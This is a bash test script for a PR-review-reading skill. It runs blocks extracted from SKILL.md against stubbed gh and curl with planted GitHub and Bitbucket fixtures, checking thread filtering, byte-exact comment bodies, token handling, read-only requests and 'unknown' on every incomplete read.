#!/usr/bin/env bash
# test-respond-to-review-contract.sh — /respond-to-review reads a teammate's
# review faithfully, keeps its record where it says, and never speaks for the
# author (#607).
#
# THE DRIFT CLASS. /respond-to-review hands a teammate's comments to a fresh
# evidence reader and, for the threads the human marks fix, to /fix-findings,
# whose Inputs rule forbids fixing a reconstruction. So the read itself is the
# contract: a block that drops a thread, paraphrases a body, or prints a
# truncated list as if it were whole sends every later step to work from a
# review nobody wrote. The failure is silent: a missing thread looks exactly
# like a thread that was never written. The same is true of the record (a
# settled thread re-opened, or a new reply missed) and of the commit trailer
# that ties a fix back to its thread. And the skill's promise never to post,
# resolve, or write into the project tree is made in prose an agent runs in
# someone else's repository.
#
# WHAT IT PINS, every block extracted from the real SKILL.md and run:
#   1. Step 1's fetch block against a stubbed `gh`: resolved threads, threads
#      and reviews the PR author started, and empty review bodies are dropped;
#      outdated threads and bots are kept; items are numbered in time order;
#      every comment body survives byte for byte; and every short or failed
#      read prints `unknown`.
#   1b. Step 1's forge selection, and its Bitbucket Cloud arm against a stubbed
#      `curl` (#610): the same filters in Bitbucket's fields, replies grouped
#      under their top-level comment, the same JSON keys as the GitHub arm,
#      byte-exact bodies, a token that never reaches curl's arguments or a host
#      other than api.bitbucket.org, and `unknown` for every short, failed, or
#      unprovable read. Run under bash and zsh.
#   2. Step 1's record read against planted records: the latest round wins per
#      thread, and a marker in any other shape is not read.
#   3. Step 1's Review-Thread log read against a scratch repo, and the trailer
#      string agreeing with the one /fix-findings Step 1 tells its fixer to write.
#   4. No fenced block in the skill posts, replies, resolves, or mutates (gh or
#      curl), and
#      the record goes through sidecar.sh rather than an inlined path.
#   5. The routes and bundles the skill depends on exist.
# Every detector is mutation-tested below.

# Every single-quoted `$` below is the skill's literal text or a planted
# fixture, never an expansion this script wants.
# shellcheck disable=SC2016
set -u
unset GIT_DIR GIT_WORK_TREE GIT_INDEX_FILE GIT_COMMON_DIR GIT_OBJECT_DIRECTORY
repo_root="$(cd "$(dirname "$0")/.." && pwd -P)"
R2R="$repo_root/respond-to-review/SKILL.md"
FF="$repo_root/fix-findings/SKILL.md"
CO="$repo_root/closeout/SKILL.md"
HELP="$repo_root/help/SKILL.md"
MANIFEST="$repo_root/scripts/skill-references.manifest"
for f in "$R2R" "$FF" "$CO" "$HELP" "$MANIFEST"; do [ -f "$f" ] || { printf 'FATAL %s is missing\n' "$f"; exit 1; }; done

tmp="$(mktemp -d)"
tmp="$(cd "$tmp" && pwd -P)"
trap 'rm -rf "$tmp"' EXIT

export GIT_CONFIG_NOSYSTEM=1
export GIT_CONFIG_GLOBAL="$tmp/gitconfig"
git config --file "$GIT_CONFIG_GLOBAL" user.name "Review Tester"
git config --file "$GIT_CONFIG_GLOBAL" user.email "tester@example.com"
git config --file "$GIT_CONFIG_GLOBAL" init.defaultBranch main

pass=0
fail=0
ok()  { printf '  ok   %s\n' "$1"; pass=$((pass + 1)); }
bad() { printf '  FAIL %s\n' "$1"; printf '       %s\n' "$2"; fail=$((fail + 1)); }
section() { printf '\n=== %s ===\n' "$1"; }
check() { if [ "$2" = "$3" ]; then ok "$1"; else bad "$1" "expected [$2], got [$3]"; fi; }

# block <file> <literal> — the first fenced bash block containing <literal>.
block() {
    awk -v want="$2" '
        /^ *```bash$/ { buf = ""; on = 1; ind = index($0, "`") - 1; next }
        on && /^ *```$/ { on = 0; if (index(buf, want)) { printf "%s", buf; exit } next }
        on { buf = buf substr($0, ind + 1) "\n" }
    ' "$1"
}

# -----------------------------------------------------------------------------
section "Step 1's fetch block, against a stubbed gh"

FETCH="$(block "$R2R" 'THREADS_JQ=')"
check "the fetch block is found" 1 "$([ -n "$FETCH" ] && echo 1 || echo 0)"
printf '%s' "$FETCH" | sed 's/^PR=<pr-number>$/PR=7/' > "$tmp/fetch.sh"
check "the fetch block's PR placeholder is substituted" 1 "$(grep -cx 'PR=7' "$tmp/fetch.sh")"

mkdir -p "$tmp/bin"
cat > "$tmp/bin/gh" <<'STUB'
#!/usr/bin/env bash
# Prints $GH_FIXTURE for a graphql call, or fails when it is absent.
printf '%s\n' "$*" >> "$GH_STUB_CALLS"
[ "$1" = api ] && [ "$2" = graphql ] || { echo "stub gh: unexpected call: $*" >&2; exit 1; }
[ -n "${GH_FIXTURE:-}" ] && [ -f "$GH_FIXTURE" ] || { echo "stub gh: 502" >&2; exit 1; }
cat "$GH_FIXTURE"
STUB
chmod +x "$tmp/bin/gh"
export GH_STUB_CALLS="$tmp/gh-calls"

# A body carrying every byte a careless pipeline mangles: a comment terminator,
# backticks, a variable, a quote, a backslash, and a second line.
TRICKY='Can we drop this? It ends the marker --> and `$HOME` is "quoted" \ here
second line'

# fixture <file> <thread-total> <review-total> <comment-total-of-thread-1> [errors]
fixture() {
    jq -n --arg tricky "$TRICKY" --argjson tt "$2" --argjson rt "$3" --argjson ct "$4" --arg err "${5:-}" '
    def c(a; b; t): {author: {login: a}, body: b, url: ("https://github.com/acme/app/pull/7#discussion_" + t), createdAt: t};
    {data: {repository: {pullRequest: {
      number: 7, state: "OPEN", headRefOid: "abc123", headRefName: "feat", author: {login: "me"},
      reviewThreads: {totalCount: $tt, nodes: [
        {id: "PRRT_a", isResolved: false, isOutdated: false, path: "src/a.ts", line: 4,
         comments: {totalCount: $ct, nodes: [c("teammate"; $tricky; "2026-10-02T00:00:00Z"), c("me"; "Fair point."; "2026-10-03T00:00:00Z")]}},
        {id: "PRRT_resolved", isResolved: true, isOutdated: false, path: "src/b.ts", line: 9,
         comments: {totalCount: 1, nodes: [c("teammate"; "settled"; "2026-10-01T00:00:00Z")]}},
        {id: "PRRT_mine", isResolved: false, isOutdated: false, path: "src/c.ts", line: 1,
         comments: {totalCount: 1, nodes: [c("me"; "note to self"; "2026-10-01T01:00:00Z")]}},
        {id: "PRRT_old", isResolved: false, isOutdated: true, path: "src/d.ts", line: null,
         comments: {totalCount: 1, nodes: [c("copilot-pull-request-reviewer"; "stale line, maybe still true"; "2026-10-01T02:00:00Z")]}}
      ]},
      reviews: {totalCount: $rt, nodes: [
        {id: "PRR_empty", state: "COMMENTED", body: "", url: "u1", author: {login: "teammate"}, submittedAt: "2026-10-02T00:00:01Z"},
        {id: "PRR_cr", state: "CHANGES_REQUESTED", body: "Please split the migration out.", url: "u2", author: {login: "teammate"}, submittedAt: "2026-10-04T00:00:00Z"},
        {id: "PRR_mine", state: "COMMENTED", body: "self review", url: "u3", author: {login: "me"}, submittedAt: "2026-10-04T01:00:00Z"}
      ]}
    }}}} + (if $err == "" then {} else {errors: [{message: $err}]} end)' > "$1"
}

runfetch() { GH_FIXTURE="$1" PATH="$tmp/bin:$PATH" bash "$tmp/fetch.sh" 2>/dev/null; }

fixture "$tmp/ok.json" 4 3 2
OUT="$(runfetch "$tmp/ok.json")"
GH_OUT="$OUT"
check "a whole read prints JSON, not unknown" 1 "$(jq -e '.items | type == "array"' <<<"$OUT" >/dev/null 2>&1 && echo 1 || echo 0)"
check "it keeps exactly the unresolved, non-author threads and the non-empty, non-author reviews" \
    "PRRT_old PRRT_a PRR_cr" "$(jq -r '[.items[].id] | join(" ")' <<<"$OUT" 2>/dev/null)"
check "items are numbered 1..n in time order" "1 2 3" "$(jq -r '[.items[].n] | map(tostring) | join(" ")' <<<"$OUT" 2>/dev/null)"
check "an outdated thread is kept and says so" "true" "$(jq -r '.items[] | select(.id == "PRRT_old") | .outdated' <<<"$OUT" 2>/dev/null)"
check "a bot's thread is kept" "copilot-pull-request-reviewer" "$(jq -r '.items[] | select(.id == "PRRT_old") | .comments[0].author' <<<"$OUT" 2>/dev/null)"
check "a thread's replies are kept, the author's included" "teammate me" "$(jq -r '.items[] | select(.id == "PRRT_a") | [.comments[].author] | join(" ")' <<<"$OUT" 2>/dev/null)"
check "last_at is the newest comment's time (what a re-run compares)" "2026-10-03T00:00:00Z" "$(jq -r '.items[] | select(.id == "PRRT_a") | .last_at' <<<"$OUT" 2>/dev/null)"
got_body="$(jq -r '.items[] | select(.id == "PRRT_a") | .comments[0].body' <<<"$OUT" 2>/dev/null)"
check "a comment body survives byte for byte" "$TRICKY" "$got_body"
check "the PR's head ref comes back (Step 1 compares it with the branch)" "feat" "$(jq -r '.head_ref' <<<"$OUT" 2>/dev/null)"

fixture "$tmp/short-threads.json" 5 3 2
check "a thread list shorter than its totalCount prints unknown" unknown "$(runfetch "$tmp/short-threads.json")"
fixture "$tmp/short-reviews.json" 4 4 2
check "a review list shorter than its totalCount prints unknown" unknown "$(runfetch "$tmp/short-reviews.json")"
fixture "$tmp/short-comments.json" 4 3 3
check "a thread whose comments came back short prints unknown" unknown "$(runfetch "$tmp/short-comments.json")"
fixture "$tmp/errors.json" 4 3 2 "Something went wrong"
check "a response carrying errors prints unknown" unknown "$(runfetch "$tmp/errors.json")"
jq '.data.repository.pullRequest.number = 8' "$tmp/ok.json" > "$tmp/other-pr.json"
check "a response for another PR prints unknown" unknown "$(runfetch "$tmp/other-pr.json")"
jq '.data.repository.pullRequest = null' "$tmp/ok.json" > "$tmp/null-pr.json"
check "a PR that did not come back prints unknown" unknown "$(runfetch "$tmp/null-pr.json")"
check "a failed gh call prints unknown" unknown "$(runfetch "$tmp/does-not-exist.json")"

# Past the bound: a PR with more than 100 threads or reviews, or a thread with
# more than 50 comments, returns a full page whose length equals the bound, so a
# guard that compares against min(totalCount, bound) passes it silently.
# The fixtures pad each list to the bound, as GitHub would return it.
fixture "$tmp/ok-over.json" 4 3 2
jq '.data.repository.pullRequest.reviewThreads |= (.totalCount = 150 | .nodes = [range(100) as $i | .nodes[0] | .id = "PRRT_\($i)"])' "$tmp/ok-over.json" > "$tmp/over-threads.json"
check "a thread list past the 100 bound prints unknown" unknown "$(runfetch "$tmp/over-threads.json")"
jq '.data.repository.pullRequest.reviews |= (.totalCount = 150 | .nodes = [range(100) as $i | .nodes[1] | .id = "PRR_\($i)"])' "$tmp/ok-over.json" > "$tmp/over-reviews.json"
check "a review list past the 100 bound prints unknown" unknown "$(runfetch "$tmp/over-reviews.json")"
jq '.data.repository.pullRequest.reviewThreads.nodes[0].comments |= (.totalCount = 80 | .nodes = [range(50) as $i | .nodes[0]])' "$tmp/ok-over.json" > "$tmp/over-comments.json"
check "a thread with comments past the 50 bound prints unknown" unknown "$(runfetch "$tmp/over-comments.json")"
jq '.data.repository.pullRequest.reviewThreads |= (.totalCount = 100 | .nodes = [range(100) as $i | .nodes[0] | .id = "PRRT_\($i)"])' "$tmp/ok-over.json" > "$tmp/at-bound.json"
check "a list exactly at the bound is still read whole" 1 "$(runfetch "$tmp/at-bound.json" | jq -e '.items | length == 101' >/dev/null 2>&1 && echo 1 || echo 0)"

# Mutation: the resolved filter is load-bearing — without it a settled thread
# comes back as feedback, and the id assertion above must notice.
sed 's/| select(.isResolved | not)//' "$tmp/fetch.sh" > "$tmp/fetch-mut.sh"
check "M1: the mutation removed the resolved filter" 0 "$(grep -c 'isResolved | not' "$tmp/fetch-mut.sh")"
MUT="$(GH_FIXTURE="$tmp/ok.json" PATH="$tmp/bin:$PATH" bash "$tmp/fetch-mut.sh" 2>/dev/null)"
check "M1: without the resolved filter the id assertion would fail" 1 \
    "$([ "$(jq -r '[.items[].id] | join(" ")' <<<"$MUT" 2>/dev/null)" != "PRRT_old PRRT_a PRR_cr" ] && echo 1 || echo 0)"
# Mutation: the truncation guard is load-bearing.
grep -v 'reviewThreads.nodes | length) != $p.reviewThreads.totalCount' "$tmp/fetch.sh" > "$tmp/fetch-mut2.sh"
check "M2: without the thread-count guard a short read is not unknown" 1 \
    "$([ "$(GH_FIXTURE="$tmp/short-threads.json" PATH="$tmp/bin:$PATH" bash "$tmp/fetch-mut2.sh" 2>/dev/null)" != unknown ] && echo 1 || echo 0)"

# -----------------------------------------------------------------------------
section "Step 1's forge selection"

SEL="$(block "$R2R" 'config get forge.kind')"
check "the forge-selection block is found" 1 "$([ -n "$SEL" ] && echo 1 || echo 0)"
# sel <sidecar forge.kind or "-" for no sidecar> <origin url>
sel() {
    cat > "$tmp/sc-forge.sh" <<STUB
#!/usr/bin/env bash
[ "\$1 \$2 \$3" = "config get forge.kind" ] || { echo "stub sidecar: unexpected call: \$*" >&2; exit 1; }
[ "$1" = - ] && { echo "SIDECAR MISS: none" >&2; exit 1; }
echo "$1"
STUB
    rm -rf "$tmp/selrepo"; git init -q "$tmp/selrepo"
    git -C "$tmp/selrepo" remote add origin "$2"
    printf '%s' "$SEL" | sed "s|^SC=\"<this skill's directory>/references/sidecar.sh\"$|SC=\"$tmp/sc-forge.sh\"|" > "$tmp/sel.sh"
    (cd "$tmp/selrepo" && bash "$tmp/sel.sh")
}
check "the sidecar's forge.kind decides" "forge=bitbucket" "$(sel bitbucket https://github.com/acme/app.git)"
check "a sidecar naming github keeps the GitHub arm on a Bitbucket origin" "forge=github" "$(sel github git@bitbucket.org:acme/app.git)"
check "gitlab is reported, so the skill can stop" "forge=gitlab" "$(sel gitlab https://gitlab.com/acme/app.git)"
check "no sidecar: a Bitbucket ssh origin picks bitbucket" "forge=bitbucket" "$(sel - git@bitbucket.org:acme/app.git)"
check "no sidecar: a Bitbucket https origin picks bitbucket" "forge=bitbucket" "$(sel - https://me@bitbucket.org/acme/app.git)"
check "a sidecar naming no forge falls back to origin" "forge=bitbucket" "$(sel none https://bitbucket.org/acme/app)"
check "no sidecar: a gitlab.com https origin is gitlab, so the skill can stop" "forge=gitlab" "$(sel - https://gitlab.com/acme/app.git)"
check "no sidecar: a self-hosted gitlab.* ssh origin is gitlab" "forge=gitlab" "$(sel - git@gitlab.example.org:acme/app.git)"
check "no sidecar: a github.com origin whose owner is named gitlab stays github" "forge=github" "$(sel - https://github.com/gitlab/app.git)"
check "anything else keeps the GitHub arm (GitHub Enterprise included)" "forge=github" "$(sel - https://git.corp.example/acme/app.git)"

# -----------------------------------------------------------------------------
section "Step 1's Bitbucket Cloud arm, against a stubbed curl"

BB="$(block "$R2R" 'BB_JQ=')"
check "the Bitbucket arm is found" 1 "$([ -n "$BB" ] && echo 1 || echo 0)"
printf '%s' "$BB" | sed 's/^PR=<pr-number>$/PR=7/' > "$tmp/bb.sh"
check "the Bitbucket arm's PR placeholder is substituted" 1 "$(grep -cx 'PR=7' "$tmp/bb.sh")"
check "the Bitbucket arm makes no gh call" 0 "$(grep -cE '(^|[^[:alnum:]_])gh ' "$tmp/bb.sh")"

mkdir -p "$tmp/bbbin"
cat > "$tmp/bbbin/curl" <<'STUB'
#!/usr/bin/env bash
# Answers from $BB_FX/<route>.json with $BB_FX/<route>.code (default 200), the
# way curl -o <file> -w '%{http_code}' -K - does. Records argv and the config
# read on stdin, so the test can see where the token went.
out=""
printf 'ARGV %s\n' "$*" >> "$BB_CALLS"
wcode=0; case "$*" in *' -w '*) wcode=1 ;; esac
while [ $# -gt 0 ]; do case "$1" in -o) out="$2"; shift 2 ;; *) shift ;; esac; done
cfg="$(cat)"
printf '%s\n' "$cfg" >> "$BB_CALLS"
[ -n "$out" ] || out=/dev/stdout
url="$(printf '%s\n' "$cfg" | sed -n 's/^url = "\(.*\)"$/\1/p')"
case "$url" in
    https://api.bitbucket.org/2.0/repositories/acme/app/pullrequests/7) route=pr ;;
    https://api.bitbucket.org/2.0/repositories/acme/app/pullrequests/7/comments\?pagelen=100) route=page1 ;;
    *'&page=2') route=page2 ;;
    *) route=none ;;
esac
[ -n "${BB_FAIL:-}" ] && [ "$route" = "$BB_FAIL" ] && exit 7
code=200; [ -f "$BB_FX/$route.code" ] && code="$(cat "$BB_FX/$route.code")"
if [ -f "$BB_FX/$route.json" ]; then cp "$BB_FX/$route.json" "$out"; else code=404; : > "$out"; fi
[ "$wcode" = 1 ] && printf '%s' "$code"
[ "$wcode" = 1 ] || [ "$code" = 200 ] || exit 22
exit 0
STUB
chmod +x "$tmp/bbbin/curl"

rm -rf "$tmp/bbrepo"; git init -q "$tmp/bbrepo"
git -C "$tmp/bbrepo" remote add origin git@bitbucket.org:acme/app.git
git -C "$tmp/bbrepo" commit -q --allow-empty -m base
BB_HEAD="$(git -C "$tmp/bbrepo" rev-parse HEAD)"

# bbfix <dir> <size> — a PR and two comment pages, covering every filter:
#   1 teammate inline root (the tricky body), 2 the author's reply to 1,
#   5 a teammate reply to 2 (a reply chain two deep, on page 2),
#   3 a resolved inline root, 4 a teammate general comment,
#   6 a root the PR author started, 7 a pending draft, 8 a deleted reply to 4,
#   9 a root whose only comment is deleted.
bbfix() {
    mkdir -p "$1"
    jq -n --arg head "${BB_HEAD:0:12}" '{id: 7, state: "OPEN", author: {uuid: "{me}", nickname: "me"},
        destination: {branch: {name: "main"}}, source: {branch: {name: "feat"}, commit: {hash: $head}}}' > "$1/pr.json"
    jq -n --arg tricky "$TRICKY" --argjson size "$2" '
      def c(id; who; t): {id: id, created_on: t, user: {uuid: ("{" + who + "}"), nickname: who},
                          links: {html: {href: ("https://bitbucket.org/acme/app/pull-requests/7#comment-" + (id | tostring))}}};
      {size: $size, pagelen: 100, page: 1,
       next: "https://api.bitbucket.org/2.0/repositories/acme/app/pullrequests/7/comments?pagelen=100&page=2",
       values: [
         (c(1; "teammate"; "2026-10-02T00:00:00Z") + {content: {raw: $tricky}, inline: {path: "src/a.ts", from: null, to: 4}}),
         (c(2; "me"; "2026-10-03T00:00:00Z") + {content: {raw: "Fair point."}, parent: {id: 1}, inline: {path: "src/a.ts", to: 4}}),
         (c(3; "teammate"; "2026-10-01T00:00:00Z") + {content: {raw: "settled"}, inline: {path: "src/b.ts", to: 9}, resolution: {type: "resolved"}}),
         (c(6; "me"; "2026-10-01T01:00:00Z") + {content: {raw: "note to self"}}),
         (c(7; "teammate"; "2026-10-01T03:00:00Z") + {content: {raw: "draft"}, pending: true})
       ]}' > "$1/page1.json"
    jq -n --argjson size "$2" '
      def c(id; who; t): {id: id, created_on: t, user: {uuid: ("{" + who + "}"), nickname: who},
                          links: {html: {href: ("https://bitbucket.org/acme/app/pull-requests/7#comment-" + (id | tostring))}}};
      {size: $size, pagelen: 100, page: 2, values: [
         (c(4; "teammate"; "2026-10-04T00:00:00Z") + {content: {raw: "Please split the migration out."}}),
         (c(5; "teammate"; "2026-10-05T00:00:00Z") + {content: {raw: "Still stands."}, parent: {id: 2}}),
         (c(8; "teammate"; "2026-10-06T00:00:00Z") + {content: {raw: ""}, deleted: true, parent: {id: 4}}),
         (c(9; "teammate"; "2026-10-01T04:00:00Z") + {content: {raw: ""}, deleted: true})
       ]}' > "$1/page2.json"
}
# runbb <fixture-dir> [shell] — with a token, unless BB_NO_TOKEN is set.
runbb() {
    : > "$tmp/bb-calls"
    tok=s3cr3t-token
    [ -n "${BB_NO_TOKEN:-}" ] && tok=
    (cd "$tmp/bbrepo" && env -u BITBUCKET_EMAIL BB_FX="$1" BB_CALLS="$tmp/bb-calls" PATH="$tmp/bbbin:$PATH" \
        BITBUCKET_TOKEN="$tok" "${2:-bash}" "$tmp/bb.sh" 2>/dev/null)
}

# runbberr <fixture-dir> [email] — stderr only (stdout dropped), same setup as runbb.
runbberr() {
    : > "$tmp/bb-calls"
    (cd "$tmp/bbrepo" && env -u BITBUCKET_EMAIL ${2:+BITBUCKET_EMAIL="$2"} BB_FX="$1" BB_CALLS="$tmp/bb-calls" PATH="$tmp/bbbin:$PATH" \
        BITBUCKET_TOKEN=s3cr3t-token bash "$tmp/bb.sh" >/dev/null 2>"$tmp/bb-err"; cat "$tmp/bb-err")
}

bbfix "$tmp/bb-ok" 9
OUT="$(runbb "$tmp/bb-ok")"
check "a whole read prints JSON, not unknown" 1 "$(jq -e '.items | type == "array"' <<<"$OUT" >/dev/null 2>&1 && echo 1 || echo 0)"
check "it keeps exactly the unresolved, non-author, non-draft, non-deleted threads" "1 4" "$(jq -r '[.items[].id] | join(" ")' <<<"$OUT" 2>/dev/null)"
# The expected key sets are read off the GitHub arm's real output (GH_OUT, from
# the same fixture), not typed here: a key added to that arm must fail these.
# Every Bitbucket item is a thread, so only the GitHub arm's thread items count.
gh_item_keys() { jq -r '[.items[] | select(.kind == "thread") | keys | join(" ")] | unique | join("|")' <<<"$1" 2>/dev/null; }
gh_comment_keys() { jq -r '[.items[] | select(.kind == "thread") | .comments[] | keys | join(" ")] | unique | join("|")' <<<"$1" 2>/dev/null; }
gh_top_keys() { jq -r 'keys | join(" ")' <<<"$1" 2>/dev/null; }
check "the GitHub arm's key sets were read (not empty)" 1 \
    "$([ -n "$(gh_item_keys "$GH_OUT")" ] && [ -n "$(gh_comment_keys "$GH_OUT")" ] && [ -n "$(gh_top_keys "$GH_OUT")" ] && echo 1 || echo 0)"
check "every item carries the GitHub arm's keys" "$(gh_item_keys "$GH_OUT")" "$(gh_item_keys "$OUT")"
check "every comment carries the GitHub arm's keys" "$(gh_comment_keys "$GH_OUT")" "$(gh_comment_keys "$OUT")"
check "the top level carries the GitHub arm's keys" "$(gh_top_keys "$GH_OUT")" "$(gh_top_keys "$OUT")"
# M13: a key added to the GitHub arm must break all three comparisons.
sed 's/{kind: "thread", id, path,/{kind: "thread", foo: 1, id, path,/' "$tmp/fetch.sh" > "$tmp/fetch-mut13.sh"
check "M13: the mutation added a key to the GitHub arm's thread" 1 "$(grep -c 'foo: 1' "$tmp/fetch-mut13.sh")"
MUT13="$(GH_FIXTURE="$tmp/ok.json" PATH="$tmp/bin:$PATH" bash "$tmp/fetch-mut13.sh" 2>/dev/null)"
check "M13: a key added to the GitHub arm no longer matches the Bitbucket arm's items" 1 \
    "$([ "$(gh_item_keys "$MUT13")" != "$(gh_item_keys "$OUT")" ] && echo 1 || echo 0)"
check "items are numbered 1..n in time order" "1 2" "$(jq -r '[.items[].n] | map(tostring) | join(" ")' <<<"$OUT" 2>/dev/null)"
check "a reply two deep, on a later page, joins its top-level thread in time order" "teammate me teammate" \
    "$(jq -r '.items[] | select(.id == "1") | [.comments[].author] | join(" ")' <<<"$OUT" 2>/dev/null)"
check "a deleted reply is dropped from its thread" 1 "$(jq -r '.items[] | select(.id == "4") | .comments | length' <<<"$OUT" 2>/dev/null)"
check "an inline thread carries path and the new-file line" "src/a.ts 4" "$(jq -r '.items[] | select(.id == "1") | "\(.path) \(.line)"' <<<"$OUT" 2>/dev/null)"
check "a general comment carries null path and line, as a thread" "null null thread" \
    "$(jq -r '.items[] | select(.id == "4") | "\(.path) \(.line) \(.kind)"' <<<"$OUT" 2>/dev/null)"
check "outdated is null, never guessed" "null" "$(jq -r '[.items[].outdated] | unique | map(tostring) | join(" ")' <<<"$OUT" 2>/dev/null)"
check "last_at is the newest comment's time" "2026-10-05T00:00:00Z" "$(jq -r '.items[] | select(.id == "1") | .last_at' <<<"$OUT" 2>/dev/null)"
check "a comment body survives byte for byte" "$TRICKY" "$(jq -r '.items[] | select(.id == "1") | .comments[0].body' <<<"$OUT" 2>/dev/null)"
check "head is expanded to the full SHA when it resolves locally" "$BB_HEAD" "$(jq -r '.head' <<<"$OUT" 2>/dev/null)"
check "head_ref is the PR's source branch" "feat" "$(jq -r '.head_ref' <<<"$OUT" 2>/dev/null)"
check "it follows the next link to page 2" 1 "$(grep -c '^url = .*&page=2"$' "$tmp/bb-calls")"
check "the token never appears in curl's arguments" 0 "$(grep '^ARGV ' "$tmp/bb-calls" | grep -c 's3cr3t-token')"
check "without an email the token is sent as a Bearer header" 3 "$(grep -cx 'header = "Authorization: Bearer s3cr3t-token"' "$tmp/bb-calls")"
check "every request is a plain GET (no request or data line reaches curl)" 0 "$(grep -ciE '^(ARGV .*(^| )(-[A-Za-z]*X|--request|-d|--data[a-z-]*|--json|-F|--form[a-z-]*|-T|--upload-file)([ =]|$)|(request|data|data-[a-z]+|form|form-[a-z]+|json|upload-file) *([=:]| ))' "$tmp/bb-calls")"
check "the arm reads the same under zsh" "$OUT" "$(runbb "$tmp/bb-ok" zsh)"
OUTE="$(cd "$tmp/bbrepo" && BB_FX="$tmp/bb-ok" BB_CALLS="$tmp/bb-calls" PATH="$tmp/bbbin:$PATH" BITBUCKET_TOKEN=s3cr3t-token BITBUCKET_EMAIL=me@example.com bash "$tmp/bb.sh" 2>/dev/null)"
check "with an email the token is sent as user credentials" 1 "$(grep -cx 'user = "me@example.com:s3cr3t-token"' "$tmp/bb-calls" | awk '{print ($1 > 0)}')"
check "with an email the read is the same" "$OUT" "$OUTE"

cp "$tmp/bb-ok/pr.json" "$tmp/bb-ok/pr.json.bak"
jq '.source.commit.hash = "0123456789ab"' "$tmp/bb-ok/pr.json.bak" > "$tmp/bb-ok/pr.json"
check "head stays the abbreviated hash when it does not resolve locally" "0123456789ab" "$(runbb "$tmp/bb-ok" | jq -r '.head' 2>/dev/null)"
mv "$tmp/bb-ok/pr.json.bak" "$tmp/bb-ok/pr.json"

# A teammate's root comment that was deleted, then the author's reply, then a
# second teammate's reply: the author did not start that thread, so it stays.
mkdir -p "$tmp/bb-delroot"
cp "$tmp/bb-ok/pr.json" "$tmp/bb-delroot/pr.json"
jq -n '
  def c(id; who; t): {id: id, created_on: t, user: {uuid: ("{" + who + "}"), nickname: who}, content: {raw: ("c" + (id | tostring))}};
  {size: 3, pagelen: 100, page: 1, values: [
     (c(1; "teammate"; "2026-10-02T00:00:00Z") + {deleted: true}),
     (c(2; "me"; "2026-10-03T00:00:00Z") + {parent: {id: 1}}),
     (c(3; "other"; "2026-10-04T00:00:00Z") + {parent: {id: 1}})]}' > "$tmp/bb-delroot/page1.json"
check "a thread whose teammate root was deleted is kept when the author replied first" "other:c3 me:c2" \
    "$(runbb "$tmp/bb-delroot" | jq -r '.items[] | [.comments[] | "\(.author):\(.body)"] | reverse | join(" ")' 2>/dev/null)"

# Every way the read can be short, failed, or unprovable prints unknown.
bbcase() { rm -rf "$tmp/bb-c"; cp -R "$tmp/bb-ok" "$tmp/bb-c"; }
bbcase; bbfix "$tmp/bb-c" 10
check "comments short of the reported size print unknown" unknown "$(runbb "$tmp/bb-c")"
bbcase; jq 'del(.size)' "$tmp/bb-ok/page1.json" > "$tmp/bb-c/page1.json"
check "a first page without size prints unknown (nothing to prove the read whole)" unknown "$(runbb "$tmp/bb-c")"
bbcase; echo 500 > "$tmp/bb-c/page2.code"
check "a non-200 page prints unknown" unknown "$(runbb "$tmp/bb-c")"
bbcase; echo 401 > "$tmp/bb-c/pr.code"
check "a non-200 PR read prints unknown" unknown "$(runbb "$tmp/bb-c")"
ERR="$(runbberr "$tmp/bb-c")"
check "a 401 names the status and the path on stderr" 1 "$(case "$ERR" in *"HTTP 401 for /2.0/repositories/acme/app/pullrequests/7"*) echo 1 ;; *) echo 0 ;; esac)"
check "a 401 without BITBUCKET_EMAIL says an API token needs it" 1 "$(case "$ERR" in *BITBUCKET_EMAIL*) echo 1 ;; *) echo 0 ;; esac)"
check "the token never reaches stderr" 0 "$(printf '%s' "$ERR" | grep -c s3cr3t-token)"
check "a non-200 still prints only unknown on stdout" unknown "$(runbb "$tmp/bb-c")"
check "with BITBUCKET_EMAIL set the hint is not printed" 0 "$(runbberr "$tmp/bb-c" me@example.com | grep -c 'needs BITBUCKET_EMAIL')"
bbcase
check "a curl that fails outright prints unknown" unknown "$(BB_FAIL=page1 runbb "$tmp/bb-c")"
bbcase; rm "$tmp/bb-c/page2.json"
check "a next link that 404s prints unknown" unknown "$(runbb "$tmp/bb-c")"
bbcase; printf '<html>rate limited</html>' > "$tmp/bb-c/page2.json"
check "a page that is not JSON prints unknown" unknown "$(runbb "$tmp/bb-c")"
bbcase; jq '.values = null' "$tmp/bb-ok/page2.json" > "$tmp/bb-c/page2.json"
check "a page without a values array prints unknown" unknown "$(runbb "$tmp/bb-c")"
bbcase; jq '.id = 8' "$tmp/bb-ok/pr.json" > "$tmp/bb-c/pr.json"
check "a response for another PR prints unknown" unknown "$(runbb "$tmp/bb-c")"
bbcase; jq '.values[1].parent.id = 999' "$tmp/bb-ok/page2.json" > "$tmp/bb-c/page2.json"
check "a reply to a comment that was not read prints unknown" unknown "$(runbb "$tmp/bb-c")"
bbcase; jq '.values += [.values[0] | .id = 50 | .parent = {id: 51}, (.values[0] | .id = 51 | .parent = {id: 50})] | .size = 11' "$tmp/bb-ok/page2.json" > "$tmp/bb-c/page2.json"
jq '.size = 11' "$tmp/bb-ok/page1.json" > "$tmp/bb-c/page1.json"
check "a reply cycle prints unknown, not a hang" unknown "$(runbb "$tmp/bb-c")"
# The page cap: a next link that never ends. Every page points at another page
# on api.bitbucket.org, so only the cap stops the loop (page1, then page2 again
# and again): 1 PR request plus 50 page requests, then unknown.
bbcase; jq '.next = "https://api.bitbucket.org/2.0/repositories/acme/app/pullrequests/7/comments?pagelen=100&page=2"' "$tmp/bb-ok/page2.json" > "$tmp/bb-c/page2.json"
check "a next link that never ends prints unknown, not a loop" unknown "$(runbb "$tmp/bb-c")"
check "and the arm stops after 50 page requests (51 requests with the PR read)" 51 "$(grep -c '^ARGV ' "$tmp/bb-calls")"
# The depth cap, apart from a cycle: a chain of N comments, each replying to the
# one before. 50 deep is read whole; 102 deep prints unknown.
bbchain() {
    rm -rf "$tmp/bb-c"; mkdir -p "$tmp/bb-c"; cp "$tmp/bb-ok/pr.json" "$tmp/bb-c/pr.json"
    jq -n --argjson n "$1" '{size: $n, pagelen: 100, page: 1, values: [range(1; $n + 1) as $i
      | {id: $i, created_on: "2026-10-02T00:00:00Z", user: {uuid: "{teammate}", nickname: "teammate"}, content: {raw: ("c" + ($i | tostring))}}
        + (if $i > 1 then {parent: {id: ($i - 1)}} else {} end)]}' > "$tmp/bb-c/page1.json"
}
bbchain 50
check "a 50-deep reply chain is read as one thread" 50 "$(runbb "$tmp/bb-c" | jq -r '.items[0].comments | length' 2>/dev/null)"
bbchain 102
check "a 102-deep reply chain with no cycle prints unknown" unknown "$(runbb "$tmp/bb-c")"
